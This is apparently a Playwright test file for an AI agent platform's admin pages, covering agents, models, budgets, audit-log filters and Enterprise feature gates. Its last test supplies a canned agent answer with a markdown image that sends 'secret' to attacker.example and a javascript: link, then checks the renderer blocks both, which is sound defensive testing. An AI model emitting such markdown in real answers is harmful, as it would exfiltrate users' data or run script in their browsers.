import { expectGate, editionOf } from "./support/edition";
import { expect, test } from "./support/fixtures";
import { ADMIN_PAGES, openPage, settled } from "./support/pages";
import { USERS } from "./support/users";

// Admin pages and their states, as the org admin. Nothing here saves a change: dialogs are
// opened and closed, filters live in the URL. Enterprise features are checked against
// GET /api/v1/edition, so the same tests pass in Community (CI) and with a license.

const admin = (path: string) => ADMIN_PAGES.find((p) => p.path === path)!;

test.use({ user: USERS.erin });

test("GET /api/v1/edition says which edition runs, and Community licenses nothing", async ({ page }) => {
  await page.goto("/");
  const edition = await editionOf(page);
  expect(["community", "enterprise"]).toContain(edition.edition);
  if (edition.edition === "community") expect(edition.features).toEqual([]);
});

test("Agents: the seeded agents, the editor with its collections and scopes, and the test console", async ({ page }) => {
  await openPage(page, admin("/admin/agents"));
  for (const name of ["HR agent", "Engineering agent", "Finance agent"]) {
    await expect(page.getByText(name, { exact: true }).first()).toBeVisible();
  }

  await page.getByRole("button", { name: "Edit HR agent" }).click();
  const dialog = page.getByRole("dialog", { name: "Edit HR agent" });
  await expect(dialog.getByRole("tab", { name: "Definition", selected: true })).toBeVisible();
  await expect(dialog.getByLabel("Name")).toHaveValue("HR agent");
  // Its collections are ticked, each with its scope; Employee Records is restricted.
  const collections = dialog.getByRole("group", { name: "Collections it searches" });
  await expect(collections.getByRole("checkbox", { name: "Employee Records" })).toBeChecked();
  await expect(collections.getByRole("listitem").filter({ hasText: "Employee Records" }).getByText("Restricted")).toBeVisible();

  // The test console waits for a question; it would call a model, so it is not run here.
  await dialog.getByRole("tab", { name: "Test console" }).click();
  const question = dialog.getByRole("textbox", { name: "Question", exact: true });
  await expect(question).toBeVisible();
  const run = dialog.getByRole("button", { name: "Run test" });
  await expect(run).toBeDisabled();
  await question.fill("How many weeks of parental leave do we get?");
  await expect(run).toBeEnabled();
  await expect(dialog.getByRole("tab", { name: "Versions" })).toBeEnabled();

  await dialog.getByRole("button", { name: "Cancel" }).click();
  await expect(dialog).toBeHidden();

  // A new agent starts empty, with no history yet.
  await page.getByRole("button", { name: "New agent" }).click();
  const creating = page.getByRole("dialog", { name: "New agent" });
  await expect(creating.getByLabel("Name")).toHaveValue("");
  await expect(creating.getByRole("tab", { name: "Versions" })).toBeDisabled();
  await creating.getByRole("button", { name: "Cancel" }).click();
  await expect(creating).toBeHidden();
});

test("Models: providers, the catalog, which model does what, and the data policy", async ({ page }) => {
  await openPage(page, admin("/admin/models"));
  for (const name of ["Providers", "Model catalog", "Which model does what", "Data policy for external models"]) {
    await expect(page.getByRole("heading", { level: 4, name })).toBeVisible();
  }
});

test("Budgets: organization, per-person caps, and department budgets behind the Enterprise gate", async ({ page }) => {
  await openPage(page, admin("/admin/budgets"));
  for (const name of ["Organization", "Default cap per person", "Caps for specific people", /^Department budgets/]) {
    await expect(page.getByRole("heading", { level: 4, name })).toBeVisible();
  }
  await expectGate(page, await editionOf(page), "department_budgets", page.getByText("Add a budget for a department"));
});

test("Governance: overdue and upcoming reviews, documents without an owner, official requests, demotions", async ({ page }) => {
  await openPage(page, admin("/admin/governance"));
  for (const name of [/^Overdue reviews/, /^Due within 30 days/, /^Without an owner/, /^Waiting for official approval/, /^No longer official/]) {
    await expect(page.getByRole("heading", { level: 4, name })).toBeVisible();
  }
  await expect(page.getByRole("link", { name: "audit log", exact: true })).toHaveAttribute("href", "/admin/audit?action=knowledge.document.");
});

test("Audit log: the filters live in the URL, and the URL sets the filters", async ({ page }) => {
  await openPage(page, admin("/admin/audit"));
  await expect(page.getByRole("status").filter({ hasText: "Showing every event." })).toBeVisible();

  // A quick filter: sign-ins only. Every row is then an auth.* action.
  const quick = page.getByRole("group", { name: "Show actions starting with" });
  await quick.getByRole("button", { name: /^Sign-in/ }).click();
  await expect(page).toHaveURL(/\/admin\/audit\?action=auth\.$/);
  await expect(quick.getByRole("button", { name: /^Sign-in/ })).toHaveAttribute("aria-pressed", "true");
  await settled(page);
  const actions = page.getByRole("table").getByRole("row").locator("td:nth-child(4)");
  await expect(actions.first()).toContainText("auth.");
  for (const action of await actions.allTextContents()) expect(action).toMatch(/^auth\./);

  // The form adds to it on submit.
  const form = page.getByRole("search", { name: "Filter the audit log" });
  await form.getByLabel("Text").fill("login");
  await form.getByRole("button", { name: "Apply filters" }).click();
  await expect(page).toHaveURL(/\?action=auth\.&q=login$/);
  await expect(form.getByRole("status")).toHaveText("2 filters applied.");

  await form.getByRole("button", { name: "Clear all" }).click();
  await expect(page).toHaveURL(/\/admin\/audit$/);

  // A link (like the one on Governance) opens with its filters filled in.
  await page.goto("/admin/audit?resource_type=document&from=2026-01-01");
  await expect(form.getByLabel("Resource type")).toHaveValue("document");
  await expect(form.getByLabel("From")).toHaveValue("2026-01-01");
  await expect(form.getByRole("status")).toHaveText("2 filters applied.");

  await expectGate(page, await editionOf(page), "advanced_audit_export", page.getByRole("link", { name: "Download the full chain (JSON lines)" }));
});

test.describe("in New York", () => {
  test.use({ timezoneId: "America/New_York" });

  test("Audit log: a date in the URL means midnight where the browser is, in the CSV link too", async ({ page }) => {
    // The server renders in UTC; React keeps a server-rendered attribute that differs, so the
    // link must not be rendered there. Midnight on 1 January in New York is 05:00 UTC.
    await page.goto("/admin/audit?from=2026-01-01");
    const csv = page.getByRole("link", { name: "Download this view as CSV" });
    await expect(csv).toHaveAttribute("href", "/api/v1/admin/audit-events/export.csv?from=2026-01-01T05%3A00%3A00.000Z");
  });
});

test("Retention: the audit log is never deleted, and the policy is an Enterprise feature", async ({ page }) => {
  await openPage(page, admin("/admin/retention"));
  await expect(page.getByRole("note").filter({ hasText: "The audit log is never deleted" })).toBeVisible();
  await expectGate(page, await editionOf(page), "retention_policies", page.getByText(/^Days to keep each kind of data/));
});

test("whatever runs, the Community side of every gate: the edition answered as Community shows each upgrade notice", async ({ page }) => {
  // Only the browser's view of the edition changes (the API keeps its own license check), so
  // a licensed stack also proves what Community users see. In CI this is the real answer.
  const community = { edition: "community", features: [], licensee: null, expires_at: null } as const;
  await page.route("**/api/v1/edition", (route) => route.fulfill({ json: community }));

  await openPage(page, admin("/admin/retention"));
  await expectGate(page, community, "retention_policies", page.getByText(/^Days to keep each kind of data/));
  await openPage(page, admin("/admin/budgets"));
  await expectGate(page, community, "department_budgets", page.getByText("Add a budget for a department"));
  await openPage(page, admin("/admin/audit"));
  await expectGate(page, community, "advanced_audit_export", page.getByRole("link", { name: "Download the full chain (JSON lines)" }));
});

test("the agent test console renders an answer as markdown, with the chat's safety rules", async ({ page }) => {
  // The answer is canned (a real one needs a model; see model.spec.ts): this checks the
  // rendering in a real browser, including that a markdown image never makes a request.
  const leaks: string[] = [];
  page.on("request", (request) => {
    if (request.url().includes("attacker.example")) leaks.push(request.url());
  });
  await page.route("**/api/v1/admin/agents/test", (route) =>
    route.fulfill({
      json: {
        routing: { mode: "single", agents: [{ key: "hr", name: "HR agent", goal: "Parental leave" }], routed_by: "planner", reason: "Canned.", tested_agent_picked: true },
        answer: {
          agent: "hr",
          goal: "Parental leave",
          text: "Parental leave is **16 weeks**, fully paid [S1].\n\n- Notice: 8 weeks\n- Split: allowed\n\n![chart](https://attacker.example/p?d=secret)\n\n[javascript link](javascript:alert(1))",
          citations: [
            { marker: "S1", document_id: "d1", title: "Leave Policy 2026", filename: "leave-policy-2026.pdf", section: "Parental leave", page: 2, trust: "official" },
          ],
          usage: { calls: 2, input_tokens: 1200, output_tokens: 80, cost_usd: 0.001, models: ["canned"] },
          steps: [{ kind: "search", detail: "parental leave", ok: true, error: null }],
          abstained: false,
          withheld: 0,
          error: null,
        },
      },
    }),
  );

  await openPage(page, admin("/admin/agents"));
  await page.getByRole("button", { name: "Edit HR agent" }).click();
  const dialog = page.getByRole("dialog", { name: "Edit HR agent" });
  await dialog.getByRole("tab", { name: "Test console" }).click();
  await dialog.getByRole("textbox", { name: "Question", exact: true }).fill("How long is parental leave?");
  await dialog.getByRole("button", { name: "Run test" }).click();

  const answer = dialog.getByRole("region", { name: "Answer from this agent" });
  await expect(answer.locator("strong", { hasText: "16 weeks" })).toBeVisible();
  await expect(answer.getByRole("listitem").filter({ hasText: "Notice: 8 weeks" })).toBeVisible();
  await expect(answer).not.toContainText("**");
  await expect(answer.getByText("[chart]")).toBeVisible();
  await expect(answer.locator("img")).toHaveCount(0);
  await expect(answer.locator('a[href^="javascript:"]')).toHaveCount(0);
  // [S1] is a chip; it takes you to the citation.
  await answer.getByRole("button", { name: "Source 1: Leave Policy 2026" }).click();
  await expect(answer.getByRole("listitem").filter({ hasText: "leave-policy-2026.pdf" })).toBeFocused();
  expect(leaks).toEqual([]);

  await dialog.getByRole("button", { name: "Cancel" }).click();
  await expect(dialog).toBeHidden();
});
